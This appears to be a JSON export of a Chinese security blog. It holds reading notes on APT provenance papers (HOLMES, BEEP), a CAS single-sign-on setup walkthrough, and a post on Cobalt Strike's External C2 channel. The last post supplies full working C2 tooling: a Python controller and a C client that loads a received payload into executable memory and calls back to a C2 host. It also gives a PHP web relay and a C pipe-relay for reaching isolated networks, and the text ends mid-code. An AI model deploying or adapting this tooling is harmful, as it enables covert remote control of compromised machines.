{"posts":[{"title":"APT溯源图构建-论文阅读第一篇-HOLMES: Real-time APT Detection through Correlation of Suspicious Information Flows","text":"本系列记录一些关于APT溯源构建provenance graph的论文阅读笔记。旨在学习论文中的一些idea。 Overview 这篇论文亮点是引入一个中间层把低维度的审计日志（通常它他们是各个程序的syscall日志），映射到高纬度的APT kill chain信息。 高纬度kill chain 引入中间层TTPs, HSG 此外还引入了一些剪枝的策略 We show how this concept can help to assess the strength of dependencies between HSG nodes. Weak dependencies can then be pruned away to eliminate many false alarms. Second, we develop noise reduction techniques that further de-emphasize dependencies that are known to be associated with benign activities. Third, we develop ranking and prioritization techniques to prune away most nodes and edges unrelated to the APT campaign. TTPs(Tactics, Techniques and Procedure)的构建 from Audit Logs，会引入一些规则，比如下面这个例子。 会引入一些规则，比如有监控到read的系统调用，从非信任IP读取数据，那么就把它记做一个Unstrusted_Read(S, P)对。S是socket, P是进程。 如果有一个P, 他申请了可执行的内存，并且这个P和Unstrusted_Read(S, P’)中的P’有关系（path_factor）那么，就把这个P加入Make_Mem_Exec(P,M)对中。 注：path_factor怎么算后面会讲。 上面的两个Make_Mem_Exec和Make_Mem_Exec会被归为高纬度，对应APT kill chain的Initial_Compromoise。 HSG(high-level scenario graph)的构建 这部分其实很简单，每一个TTP是一个小节点，节点之前是否连线就是他们是否有prerequisites里面的关系。 ATP Stage是一个大节点。 HSG剪枝技术 Avoiding Spurious Dependencies 这里引入了弱关联和强关联的概念，比如下图的中nginx error.log。cat和nginx就是弱关联，可能黑客通过nginx入侵过程中产生了一些日志，然后被管理员用cat读到了。 所以作者在这里形式化的引入一个ancestral cover AC(f)，它是由∀p ∈ f ∃a ∈ AC(f) a = p or a is an ancestor of p 所定义。 一个信息流f的每一个p，把这个p和它的祖先进程都加入一个集合，这个集合就是AC(f)。接着引入一个ACmin(f)的概念代表size最小的AC(f)。 注：这里类似于一个最大公约数的概念，如果nginx和cat由一个共同的祖先进程那么ACmin(f)就是1。显然这里nginx和cat并没有，所以ACmin(f)就是2。 因为一个node1到另一个node2可能有多条路径，f1, …, fn。每一个，路径都会有一个ACmin(f)，而这些ACmin(f)中最小的那个值就是上面path_factor想表达的东西。 path_factor(N1, N2) = minimum AC(f) of per path。 评论：看下来就是判断两个进程是否有共同的祖先，不知道为什么要搞得这么复杂。 Noise reduction based on benign prerequisites. 作者认为一些长时间运行的良性进程可能也会触发TTP的规则，所以他会预先观察程序在良性环境情况触发TTPs的情况然后加成规则排除他们。 但是这样其实又会引入漏报，比如万一真的nginx在启动时会读/etc/passwd，然后他被当白样本学习了，造成黑客真的打进来的时候被忽略。 所以作者又提出，可以根据从/etc/passwd读出的大小来判断 -&gt; 读一次时正常，老是读就不正常了。 评论：感觉这就是一个笨办法，需要一个进程case by case的优化。 Signal Correlation and Detection 因为kill chain有7步，所以会根据每一步最大的那个risk level，放进元组&lt;S1, S2, S3, …, S7&gt; 然后根据这个元组算出一个分。 基于两个主要标准设计的：(1) 灵活性和定制化，以及 (2) 随着步骤展开，APT步骤的相关性反映在分数的放大上。 评论：这一步看起来还挺科学的 完整的TTPs","link":"/2024/10/05/APT%E6%BA%AF%E6%BA%90%E5%9B%BE%E6%9E%84%E5%BB%BA-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%AC%E4%B8%80%E7%AF%87-HOLMES-Real-time-APT-Detection-through-Correlation-of-Suspicious-Information-Flows/"},{"title":"APT溯源图构建-论文阅读第二篇-BEEP-High Accuracy Attack Provenance via Binary-based Execution Partition","text":"Overview 这篇文章是19年的时候作者觉得现在基于syscall的日志粒度太粗糙了，可能引起路径爆炸的问题，所以提出了一个unit的概念用来精细化。 为什么粗糙？ 其实只要是一些长时间跑的程序会有，比如浏览器，比如email软件。 比如一天一个人会收到无数封邮件，其中有一封是钓鱼邮件，这个受害者使用Pine（一个文本基的电子邮件客户端）触发firefox打开钓鱼邮件里面恶意链接之后，中了木马。 因为邮件程序和firefox程序都是在长时间运行，所以一旦出了问题难以溯源，究竟是哪一封邮件，触发哪一个钓鱼IP导致的问题。 Existing Heuristics method 一些现有的解决这个问题的方法是 使用时间戳来关联到近似的精准的因果关系 -&gt; 显然者并不是一个优雅的方法 既然一个程序（进程）粒度太粗了那就切分到线程级别来做 -&gt; 但是一些程序是用线程池的，仍然会造成因果混乱。 从file segment的角度关联，只有读了同一个文件指定segment才关联到一起。-&gt; 显然也不优雅，如果两个不相关的进程恰好整体读了文件，也会有错误因果关系。 Insight 作者观察到这种长时间运行的程序都会有loop的特征。所以作者把每一次循环都看作是一个unit，然后关联unit之间的关系。做到细粒度的关联。 并且作者观察到这种loop特征的长时间运行程序基本都是事件驱动类型的。 作者把他们分成了三种pattern Single-process 比如W3M Multiprocess 比如SSH直接fork一个新进程。 multi-threaded, respectively 比如apache http server, 两个线程，一个线程“生产”，一个线程“消费” 每一次循环可以看成一个独立的子执行一个unit 子进程没有loop，所以子进程看成一个unit 把生产者的一次循环和对应触发的消费者的那一次循环看成两个unit 如3这种比较复杂的需要找到unit之间的依赖关系，如果这种loop是被系统事件驱动很好找，因为监控系统调用就行了比如socket/file。 但是对于一些不是由系统event触发的loop，就需要考察是enqueue和dequeue进行插桩关联。 识别unit 作者先是放弃了静态分析的方法，因为静态分析总是不精确的（参考莱斯定理哈哈）。 首先作者总结了包含unit的loop的特征 这样的loop一般会倾向于出现在顶层 这样的loop一般会有一个syscall产生输入后或者输出 但是这个特征并不精确，作者观察到有一些init和finailize的逻辑也会在顶层循环中，并且他发现在第二级loop中的逻辑才是我们想要找的unit。比如他们研究pine的时候发现的例子。 所以为了容忍这种情况，作者用tranning的方法对top level和second level的loop进行排查。 这个trainning的具体做法是 In the training phase, our technique first constructs control flow graphs and call graphs for subject binaries using PEBIL [21], to identify loop heads and exits. Then we perform dynamic instrumentation using PIN [23] to log the beginning and ending of each iteration of all loops and system calls. We analyze the generated training log to filter out those loops that nest too deep or do not involve input/output syscalls. 然后作者在后面说他把细节省略，但是我其实挺想看这些工程化细节的。。。 这三列就是作者分别识别出来的，这程序总共有多少个loop，第一二季有多少loop，包含syscall有多少loop 关联unit 捕获单元间的依赖关系对于隔离由多个单元构成的语义独立子执行是非常重要的。 这里基本思路是改进版的访问同一块内存。作者这里定义了两种类型的unit依赖 Low Level Dependence：比如一些日志或者内存的管理，或者一个程序要通过更新全局变量的方式向另一个方报告自己的状态etc。这些东西可能导致最终把所有的unit都关联起来。 Workflow Dependence：这两个unit有明确的工作流关系 比如这里实线是Workflow Dependence，Low Level Dependence是虚线由update(log_buf)导致。 所以作者这里又加两个规则（为了拿到workflow dependence） 两个有workflow dependence关系unit共享heap object的变量，而不是全局变量或者栈变量 来自同一个loop的unit都会有不同对象比如socket_A，socket_b，socket_c，但是像log_buf都是大家都有。 作者下面给了一个算法来自动化的寻找unit We instrument libc memory allocation functions to detect all heap objects and their sizes. We instrument all memory accesses to check if an access targets on any of the allocated heap objects. If so, we log the access. We instrument all the unit loops identified in the previous phase to log the begin and the end of a unit. Essentially, we log each instance of a unit loop head. The execution between two consecutive instances of the loop head denotes a unit. We then associate all the heap objects to the units in which they are accessed. For a heap access instruction inside a unit loop, if it accesses unique heap objects in different units and these objects cause inter-unit dependences, we consider it a unit dependence inducing instruction.* In other words, if an instruction ever accesses the same heap object in multiple units, it is excluded; if the object accessed by an instruction can never cause cross-unit dependence, it is excluded.* 在这个例子中算法会排除0x1,0x10 etc,因为他们在多个unit中都用到了，而0x10001只被两个unit共享所以会被看成有workflow dependence。0x20001同理。 后面作者又优化了一下这种算法，因为他发现我在两个有workflow dependence的unit里面，比如unit1-1 unit2-1 unit1-1写入0x50000, 0x50010。然后unit2-1读取0x50000, 0x50010。他们都会建立两次关系，但其实可能只是读了一个结构体的不同field，作者觉得unit1-1的写和unit2-1的读总是对称的。所以只选第一个field建立一次关系。 评论：但是我不懂作者是如何做到这一点的，怎么判断是不是同一个结构体的field？通过插桩的记录的chunk起始地址和大小？ 后面还有一些其他的内容，比如作者提到动态测试覆盖不全可能会miss loop，或者上面规则不够完备还是可能关联上low level的dependence进来，最后还给了建立provence的算法。不过我觉得精华都在unit在这部分。","link":"/2024/10/09/APT%E6%BA%AF%E6%BA%90%E5%9B%BE%E6%9E%84%E5%BB%BA-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%AC%E4%BA%8C%E7%AF%87-BEEP-High-Accuracy-Attack-Provenance-via-Binary-based-Execution-Partition/"},{"title":"CAS的搭建及认证流程分析与比较","text":"CAS 简介 CAS是一个单点登录（Single Sign On,简称SSO，SSO使得在多个应用系统中，用户只需要登录一次就可以访问所有相互信任的应用系统）框架，开始是由耶鲁大学的一个组织开发，后来归到apereo去管。 CAS Server搭建 在此下载：https://github.com/apereo/cas/tree/4.1.x 通常来说用mvn编译cas-server-webapp后放到tomcat中就行，但是cas默认需要走https，否则在登陆流程和跳转webapp流程中会出现如下两种报错。 第一种解决办法是生成一个自签名的ssl证书并在tomcat的server.xml中配置。 1keytool -genkey -alias tomcat -keyalg RSA -keystore /path/to/my/keystore 1234&lt;Connector port=&quot;8443&quot; protocol=&quot;org.apache.coyote.http11.Http11NioProtocol&quot; maxThreads=&quot;150&quot; SSLEnabled=&quot;true&quot; scheme=&quot;https&quot; secure=&quot;true&quot; keystoreFile=&quot;${user.home}/.keystore&quot; keystorePass=&quot;p@assw0rd&quot; clientAuth=&quot;false&quot; sslProtocol=&quot;TLS&quot; /&gt; 但是这种方法影响wireshark后续抓包分析，并且默认情况下CAS要求webapp也是https。 第二种办法是修改cas配置使其允许http。有下面四步。 在p:httpClient-ref=&quot;supportsTrustStoreSslSocketFactoryHttpClient&quot;后增加p:requireSecure=&quot;false&quot; 修改WEB-INF/spring-configuration/ticketGrantingTicketCookieGenerator.xml 修改WEB-INF/spring-configuration/warnCookieGenerator.xml 修改注册服务WEB-INF/classes/services/HTTPSandIMAPS-10000001.json将&quot;serviceId&quot; : &quot;^(https|imaps)://.*&quot;修改为&quot;serviceId&quot; : &quot;^(https|http|imaps)://.*&quot; 修改重启后虽然前端还是会爆错，但是其实正常登陆了。默认的帐密是casuser/Mellon，记录在deployerConfigContext.xml中。 Webapp搭建 在此下载：https://github.com/UniconLabs/cas-sample-java-webapp 修改web.xml中casServerLoginUrl、casServerUrlPrefix、serverName值。casServerLoginUrl对应cas server地址（如果来客没有登陆过webapp就会把来客重定向到这里进行cas统一认证），casServerUrlPrefix对应cas server地址（这个值后续会跟一些api路径做拼接），serverName是webapp地址。 认证流程分析 环境ip说明 cas server：172.16.247.1 cas webapp：172.16.247.139 用户：172.16.247.131 user访问webapp，因为之前从未登陆过webapp，所以webapp会把user重定向给cas进行统一登陆（重定向的url的serivce中带有webapp自己的url好让cas知道user登陆成功后该重定向回哪里）。 user在cas登陆，登陆成功后cas会给user带一个cookie（TGC也叫TGT，如果之后要登陆其他webapp就不用重复输入密码而是直接给ST了）和一个ST（在location url中）的302回webapp。 webapp拿到user请求过来的ST会向CAS的api发送已验证ST的合法性，如果cas验证成功会发送给CAS的是成功的状态信息和用户的一些数据。 webapp从cas那里得知ST是有效的，给user设置cookie（用户之后就不必再走一次这个流程了）。并让用户成功登陆。 一图胜千言，图片来自网络（侵删）。 SSO vs Kerberos vs OAuth 当时看完整个cas的认证流程感觉里面一些要素和kerberos和OAuth认证很相似（都有一个第三方来进行认证/授权）。因此相比较一下这三者的区别。 SSO vs Kerberos sso和kerberos和共同点在他们都一个用TGT换ST的过程，不同点在于kerberos中其实有四个角色（client，KDC-AS，KDC-TS，server）并且因为“相近”的两个之间预先共享密钥，所以server不需要发送请求向KDC求证ST的真实性，但是CAS中server需要向cas server求证真实性。 SSO vs OAuth 它俩之前最大的不同的在业务场景的不同，SSO用在一个公司内部员工的单点登陆。OAuth用在两个公司之前A公司获取其用户在B公司的一些数据。OAuth还常常涉及到啊AB两公司的帐号绑定，所以需要state来防止csrf，这个是SSO里面没有的。 杂 编译整个cas的遇到org.samba.jcifs:jcifs-ext:0.9.4无法下载的问题，选择手动下载jar并安装到本地maven仓库中。 12#下载地址：http://maven.yonyoucloud.com/nexus/content/groups/public/org/samba/jcifs/jcifs-ext/0.9.4/mvn install:install-file -DgroupId=org.samba.jcifs -DartifactId=jcifs-ext -Dversion=0.9.4 -Dpackaging=jar -Dfile=/Users/cengsiqi/Downloads/jcifs-ext-0.9.4.jar 参考 cas 4.1.4单点登录实战 CAS 4.1.10关闭HTTPS 使用maven命令安装jar包到本地maven仓库 Spring P标签的使用","link":"/2020/01/31/CAS%E7%9A%84%E6%90%AD%E5%BB%BA%E5%8F%8A%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90%E4%B8%8E%E6%AF%94%E8%BE%83/"},{"title":"CobaltStrike External C2信道","text":"简介 CS的扩展C2接口（Cobalt Strike External Command and Control）可以允许第三方程序作为teamserver和Beacon之间的一个额外通信层。以下简称External C2。 架构 External C2由一个第三方控制器和第三方客户端组成。架构示意图如下。 说白了就是一个代理转发的功能。 第三方控制器负责连接上CS的External C2服务、转发External C2服务提供的payload stage、转发攻击者下达的任务、Beeacon会话的相应等。 第三方服务端负责注入payload stage到内存、读取Beacon Session的相应，下达服务端传达的任务给Beacon session。 External C2协议 数据帧 External C2和SMB Beacon使用相同格式的数据帧（即External C2接收和发送的帧，SMB Beacon接受和发送的帧都是一样的）。所有帧都以4字节的小端字节顺序整数开始，此整数是帧内数据的长度。后面紧跟帧内数据。 未授权 External C2不会对向它连接的第三方控制器进行鉴权，这听上很不合理，但事实它的本质就是一个listener。 External C2组件 External C2 Server 使用AS脚本进行启动，启动命令是 1externalc2_start(&quot;0.0.0.0&quot;, 2222); 第三方控制器 当需要新会话时，第三方控制器连接到External C2。 与External C2的每个连接视作一个会话服务。 第三方控制器连接上External C2的第一个任务是发送需要的配置信息。它包括架构信息arch，命名管道pipename，回连间隔时间block。External C2不会ack这些消息，当配置完成后发送go指令，以告诉External C2发送payload stage 第三方控制器读取到payload stage并转发给第三方客户端，此时，第三方控制器必须等待从第三方客户端接收帧。 当此帧到来时，第三方控制器必须将帧写入到它对External C2 Server的连接（socket）。 第三方控制器现在必须从External C2 Server读取一个帧。 External C2 Server将等待配置的block时间再发送任务。 如果没有任何可用任务，External C2 Server将生成一个空任务的帧。 第三方控制器必须将其读取的帧发送给第三方客户端。 第三方控制器会一直重复等待-&gt;从一方读取-&gt;转发到另一方-&gt;等待的过程。 第三方客户端 第三方客户端将接受第三方控制器第一步发来的payload stage。这个payload stage是一个因头部被patch可以自启动的DLL。正常的进程注入可以运行这段代码。 一旦payload stage跑起来了，第三方客户端可以连接便可以连接到命名管道服务器。第三方代理将像文件一样以读写方式打开命名管道。打开命名管道的路径是\\\\.\\pipe\\[pipe name here]。如果第三方客户端的语言有操作命名管道的API也可以使用。 第三方客户端现在必须从Beacon命名管道连接中读取一个帧。 读取此帧后，第三方客户端必须将此帧中继到第三方控制器进行处理。 第三方客户端现在必须等待来自第三方控制器的帧。 一旦此帧可用，第三方客户端必须将此帧写入命名管道连接。 第三方客户端也会一直重复等待-&gt;从一方读取-&gt;转发到另一方-&gt;等待的过程。 Demo代码 控制端 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869import socketimport structimport timeclass ExternalC2Controller: def __init__(self, port): self.port = port def encodeFrame(self, data): return struct.pack(&quot;&lt;I&quot;, len(data)) + data def sendToTS(self, data): self._socketTS.sendall(self.encodeFrame(data)) def recvFromTS(self): data = &quot;&quot; _len = self._socketTS.recv(4) l = struct.unpack(&quot;&lt;I&quot;,_len)[0] while len(data) &lt; l: data += self._socketTS.recv(l - len(data)) return data def sendToBeacon(self, data): self._socketClient.sendall(self.encodeFrame(data)) def recvFromBeacon(self): data = &quot;&quot; _len = self._socketClient.recv(4) l = struct.unpack(&quot;&lt;I&quot;,_len)[0] while len(data) &lt; l: data += self._socketClient.recv(l - len(data)) return data def run(self): # First thing, wait for a connection from our custom beacon self._socketBeacon = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP) self._socketBeacon.bind((&quot;0.0.0.0&quot;, 8081)) self._socketBeacon.listen(1) self._socketClient = self._socketBeacon.accept()[0] print &quot;Received C2 connection&quot; # Now we have a beacon connection, we kick off comms with CS External C2 self._socketTS = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP) self._socketTS.connect((&quot;127.0.0.1&quot;, self.port)) # Send out config options self.sendToTS(&quot;arch=x86&quot;) self.sendToTS(&quot;pipename=xpntest&quot;) self.sendToTS(&quot;block=500&quot;) self.sendToTS(&quot;go&quot;) # Receive the beacon payload from CS to forward to our custom beacon data = self.recvFromTS() while(True): print &quot;Sending %d bytes to beacon&quot; % len(data) self.sendToBeacon(data) data = self.recvFromBeacon() print &quot;Received %d bytes from beacon&quot; % len(data) print &quot;Sending %d bytes to TS&quot; % len(data) self.sendToTS(data) data = self.recvFromTS() print &quot;Received %d bytes from TS&quot; % len(data)controller = ExternalC2Controller(2222)controller.run() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151// ConsoleApplication1.cpp : This file contains the 'main' function. Program execution begins and ends there.//#include &quot;pch.h&quot;#include &lt;WinSock2.h&gt;#include &lt;sys/stat.h&gt;#include &lt;ShellAPI.h&gt;#include &lt;Shlobj.h&gt;#pragma comment(lib,&quot;ws2_32.lib&quot;)#pragma comment(lib,&quot;user32.lib&quot;)#pragma comment(lib,&quot;Advapi32.lib&quot;) #pragma comment(lib,&quot;Shell32.lib&quot;)#pragma warning(disable:4996)// Allocates a RWX page for the CS beacon, copies the payload, and starts a new threadvoid spawnBeacon(char *payload, DWORD len) { HANDLE threadHandle; DWORD threadId = 0; char *alloc = (char *)VirtualAlloc(NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(alloc, payload, len); threadHandle = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)alloc, NULL, 0, &amp;threadId);}// Sends data to our C2 controller received from our injected beaconvoid sendData(SOCKET sd, const char *data, DWORD len) { char *buffer = (char *)malloc(len + 4); if (buffer == NULL) return; DWORD bytesWritten = 0, totalLen = 0; *(DWORD *)buffer = len; memcpy(buffer + 4, data, len); while (totalLen &lt; len + 4) { bytesWritten = send(sd, buffer + totalLen, len + 4 - totalLen, 0); totalLen += bytesWritten; } free(buffer);}// Receives data from our C2 controller to be relayed to the injected beaconchar *recvData(SOCKET sd, DWORD *len) { char *buffer; DWORD bytesReceived = 0, totalLen = 0; *len = 0; recv(sd, (char *)len, 4, 0); buffer = (char *)malloc(*len); if (buffer == NULL) return NULL; while (totalLen &lt; *len) { bytesReceived = recv(sd, buffer + totalLen, *len - totalLen, 0); totalLen += bytesReceived; } return buffer;}// Creates a new C2 controller connection for relaying commandsSOCKET createC2Socket(const char *addr, WORD port) { WSADATA wsd; SOCKET sd; SOCKADDR_IN sin; WSAStartup(0x0202, &amp;wsd); memset(&amp;sin, 0, sizeof(sin)); sin.sin_family = AF_INET; sin.sin_port = htons(port); sin.sin_addr.S_un.S_addr = inet_addr(addr); sd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); connect(sd, (SOCKADDR*)&amp;sin, sizeof(sin)); return sd;}// Connects to the name pipe spawned by the injected beaconHANDLE connectBeaconPipe(const char *pipeName) { HANDLE beaconPipe; beaconPipe = CreateFileA(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, NULL, NULL); return beaconPipe;}// Receives data from our injected beacon via a named pipechar *recvFromBeacon(HANDLE pipe, DWORD *len) { char *buffer; DWORD bytesRead = 0, totalLen = 0; *len = 0; ReadFile(pipe, len, 4, &amp;bytesRead, NULL); buffer = (char *)malloc(*len); while (totalLen &lt; *len) { ReadFile(pipe, buffer + totalLen, *len - totalLen, &amp;bytesRead, NULL); totalLen += bytesRead; } return buffer;}// Write data to our injected beacon via a named pipevoid sendToBeacon(HANDLE pipe, const char *data, DWORD len) { DWORD bytesWritten = 0; WriteFile(pipe, &amp;len, 4, &amp;bytesWritten, NULL); WriteFile(pipe, data, len, &amp;bytesWritten, NULL);}int main(){ DWORD payloadLen = 0; char *payloadData = NULL; HANDLE beaconPipe = INVALID_HANDLE_VALUE; // Create a connection back to our C2 controller SOCKET c2socket = createC2Socket(&quot;172.16.247.10&quot;, 8081); payloadData = recvData(c2socket, &amp;payloadLen); // Start the CS beacon spawnBeacon(payloadData, payloadLen); // Loop until the pipe is up and ready to use while (beaconPipe == INVALID_HANDLE_VALUE) { // Create our IPC pipe for talking to the C2 beacon Sleep(500); beaconPipe = connectBeaconPipe(&quot;\\\\\\\\.\\\\pipe\\\\xpntest&quot;); } while (true) { // Start the pipe dance payloadData = recvFromBeacon(beaconPipe, &amp;payloadLen); if (payloadLen == 0) break; sendData(c2socket, payloadData, payloadLen); free(payloadData); payloadData = recvData(c2socket, &amp;payloadLen); if (payloadLen == 0) break; sendToBeacon(beaconPipe, payloadData, payloadLen); free(payloadData); } return 0;} 用External C2 解决不出网的问题 这种情况使用client.php client.exe smb-beacon.exe作为一个通信链路。其运作方式是，client.exe打开管道smb-beacon.exe创建的beacon管道，读出数据写入client.exe创建的clientread管道，client.php打开clientread管道将数据传回第三方控制器。client.php将第三方控制器传入来的数据写入client.exe创建的clientwrite管道中，client.exe再读取clientwrite管道中的数据写入beacon管道。 client.exe在整个流程中扮演数据中继的角色，之所以需要client.exe做中继的本质原因是对于smb beacon来说每打开一次（fopen）相当于就是建立一个新的对话，而php没法对文件句柄持久化，如果用php直接操作beacon每次请求php都相当于一次另起炉灶，根本没有办法建立进行通信。所以client.exe对beacon句柄做持久化。 以下是demo代码，基本抄袭自hl0rey师傅的项目，代码中继管道的cpp代码只能在win10上跑，win7上跑不了，暂不清楚原因。 控制器 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import socketimport structimport timeimport requestsclass ExternalC2Controller: def __init__(self, port): self.port = port def encodeFrame(self, data): return struct.pack(&quot;&lt;I&quot;, len(data)) + data def sendToTS(self, data): print &quot;Send To Ts &quot; + self.encodeFrame(data) self._socketTS.sendall(self.encodeFrame(data)) def recvFromTS(self): data = &quot;&quot; _len = self._socketTS.recv(4) l = struct.unpack(&quot;&lt;I&quot;,_len)[0] while len(data) &lt; l: data += self._socketTS.recv(l - len(data)) return data def sendToBeacon(self, data): params['action'] = &quot;write&quot; params['pipename'] = &quot;hlwrite&quot; params['data'] = self.encodeFrame(data) resp = requests.post(url=URL, data=params, timeout=30) print &quot;Write Content: &quot; + resp.text params['data'] = &quot;&quot; def recvFromBeacon(self): params['action'] = &quot;read&quot; params['pipename'] = &quot;hlread&quot; resp = requests.get(url=URL, params=params, timeout=30) print &quot;Read Content: &quot; + resp.text return resp.content def run(self): self._socketTS = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP) self._socketTS.connect((&quot;127.0.0.1&quot;, self.port)) self.sendToTS(&quot;arch=x64&quot;) self.sendToTS(&quot;pipename=xpntest&quot;) self.sendToTS(&quot;block=500&quot;) self.sendToTS(&quot;go&quot;) data = self.recvFromTS() while(True): data = self.recvFromBeacon() print &quot;Received %d bytes from beacon&quot; % len(data) print &quot;Sending %d bytes to TS&quot; % len(data) self.sendToTS(data) data = self.recvFromTS() print &quot;Received %d bytes from TS&quot; % len(data) print &quot;Sending %d bytes to beacon&quot; % len(data) self.sendToBeacon(data) time.sleep(3) #URL = &quot;http://172.16.247.145/pipe.php&quot;URL = &quot;http://172.16.247.145/index.php&quot;params = {&quot;pipename&quot;:&quot;xpntest&quot;, &quot;action&quot;:&quot;&quot;, &quot;data&quot;:&quot;&quot;}controller = ExternalC2Controller(2222)controller.run() 123456789101112131415161718192021222324252627282930&lt;?php function recvFromBeacon($pipename){ $fp = fopen($pipename, &quot;rb&quot;); $len=fread($fp, 4); $len=unpack(&quot;v&quot;, $len)[1]; $data=fread($fp, $len); fclose($fp); echo $data; } function sendToBeacon($pipename){ $fp = fopen($pipename, &quot;wb&quot;); $data=$_REQUEST[&quot;data&quot;]; fwrite($fp, $data); fclose($fp); echo $data; } if(isset($_REQUEST['action']) &amp;&amp; $_REQUEST['pipename']){ $pipename = '\\\\\\\\.\\\\pipe\\\\'.$_REQUEST['pipename']; if ($_REQUEST['action']=='read'){ recvFromBeacon($pipename); }elseif ($_REQUEST['action']=='write'){ sendToBeacon($pipename); } }else{ header('HTTP/1.1 404 Not Found'); exit('404'); } 中继代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#define PAYLOAD_MAX_SIZE 512 * 1024#define BUFFER_MAX_SIZE 1024 * 1024//桥，字面意思。方便把自定义的管道和beacon管道桥接的结构体struct BRIDGE{ HANDLE client; HANDLE server;};//从beacon读取数据DWORD read_frame(HANDLE my_handle, char* buffer, DWORD max) { DWORD size = 0, temp = 0, total = 0; /* read the 4-byte length */ ReadFile(my_handle, (char*)&amp; size, 4, &amp;temp, NULL); printf(&quot;read_frame length: %d\\n&quot;, size); /* read the whole thing in */ while (total &lt; size) { ReadFile(my_handle, buffer + total, size - total, &amp;temp, NULL); total += temp; } return size;}//向beacon写入数据void write_frame(HANDLE my_handle, char* buffer, DWORD length) { printf(&quot;write_frame length: %d\\n&quot;, length); DWORD wrote = 0; WriteFile(my_handle, (void*)&amp; length, 4, &amp;wrote, NULL); printf(&quot;write %d bytes.\\n&quot;, wrote); WriteFile(my_handle, buffer, length, &amp;wrote, NULL); printf(&quot;write %d bytes.\\n&quot;, wrote);}//从控制器读取数据DWORD read_client(HANDLE my_handle, char* buffer) { DWORD size = 0; DWORD readed = 0; ReadFile(my_handle, &amp;size, 4, NULL, NULL); printf(&quot;read_client length: %d\\n&quot;, size); ReadFile(my_handle, buffer, size, &amp;readed, NULL); printf(&quot;final data from client: %d\\n&quot;, readed); return readed;}//向控制器写入数据void write_client(HANDLE my_handle, char* buffer, DWORD length) { DWORD wrote = 0; WriteFile(my_handle, buffer, length, &amp;wrote, NULL); printf(&quot;write client total %d data %d\\n&quot;, wrote, length);}//客户端读管道、服务端写管道逻辑DWORD WINAPI ReadOnlyPipeProcess(LPVOID lpvParam) { //把两条管道的句柄取出来 struct BRIDGE* bridge = (struct BRIDGE*)lpvParam; HANDLE hpipe = bridge-&gt;client; HANDLE beacon = bridge-&gt;server; DWORD length = 0; char* buffer = VirtualAlloc(0, BUFFER_MAX_SIZE, MEM_COMMIT, PAGE_READWRITE); if (buffer == NULL) { exit(-1); } //再次校验管道 if ((hpipe == INVALID_HANDLE_VALUE) || (beacon == INVALID_HANDLE_VALUE)) { return FALSE; } while (TRUE) { if (ConnectNamedPipe(hpipe, NULL)) { printf(&quot;client want read.\\n&quot;); length = read_frame(beacon, buffer, BUFFER_MAX_SIZE); printf(&quot;read from beacon: %d\\n&quot;, length); //分两次传送，发一次长度，再发数据。 write_client(hpipe,(char *) &amp;length, 4); FlushFileBuffers(hpipe); write_client(hpipe, buffer, length); FlushFileBuffers(hpipe); DisconnectNamedPipe(hpipe); //清空缓存区 ZeroMemory(buffer, BUFFER_MAX_SIZE); length = 0; } } return 1;}//客户端写管道、服务端读管道逻辑DWORD WINAPI WriteOnlyPipeProcess(LPVOID lpvParam) { //取出两条管道 struct BRIDGE* bridge = (struct BRIDGE*)lpvParam; HANDLE hpipe = bridge-&gt;client; HANDLE beacon = bridge-&gt;server; DWORD length = 0; char* buffer = VirtualAlloc(0, BUFFER_MAX_SIZE, MEM_COMMIT, PAGE_READWRITE); if (buffer == NULL) { exit(-1); } if ((hpipe == INVALID_HANDLE_VALUE) || (beacon == INVALID_HANDLE_VALUE)) { return FALSE; } while (TRUE) { if (ConnectNamedPipe(hpipe, NULL)) { //一次性读，一次性写 printf(&quot;client want write.\\n&quot;); length = read_client(hpipe, buffer); printf(&quot;read from client: %d\\n&quot;, length); write_frame(beacon, buffer, length); DisconnectNamedPipe(hpipe); //清空缓存区 ZeroMemory(buffer, BUFFER_MAX_SIZE); length = 0; } } return 2;}int main(int argc, char* argv[]) { //创建客户端读管道 HANDLE hPipeRead = CreateNamedPipe(&quot;\\\\\\\\.\\\\pipe\\\\hlread&quot;, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, BUFFER_MAX_SIZE, BUFFER_MAX_SIZE, 0, NULL); //创建客户端写管道 HANDLE hPipeWrite = CreateNamedPipe(&quot;\\\\\\\\.\\\\pipe\\\\hlwrite&quot;, PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, BUFFER_MAX_SIZE, BUFFER_MAX_SIZE, 0, NULL); //与beacon建立连接 HANDLE hfileServer = CreateFileA(&quot;\\\\\\\\.\\\\pipe\\\\hltest&quot;, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL); //检测管道和连接是否建立成功 if ((hPipeRead == INVALID_HANDLE_VALUE) || (hPipeWrite == INVALID_HANDLE_VALUE) || (hfileServer == INVALID_HANDLE_VALUE)) { if (hPipeRead == 